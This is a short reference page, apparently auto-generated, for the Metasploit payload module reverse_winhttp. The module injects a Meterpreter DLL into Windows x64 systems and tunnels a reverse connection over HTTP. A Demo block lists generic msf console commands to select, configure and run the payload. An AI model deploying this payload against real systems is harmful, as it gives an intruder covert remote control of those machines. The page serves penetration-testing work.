## Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)

Inject the meterpreter server DLL via the Reflective Dll 
Injection payload (staged x64). Tunnel communication over 
HTTP (Windows x64 winhttp)


## Module Name
payload/windows/x64/meterpreter/reverse_winhttp

## Authors
* skape
* sf
* OJ Reeves


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/x64/meterpreter/reverse_winhttp
msf payload(reverse_winhttp) > show targets
   ... a list of targets ...
msf payload(reverse_winhttp) > set TARGET <target-id>
msf payload(reverse_winhttp) > show options
   ... show and set options ...
msf payload(reverse_winhttp) > run
```
    
    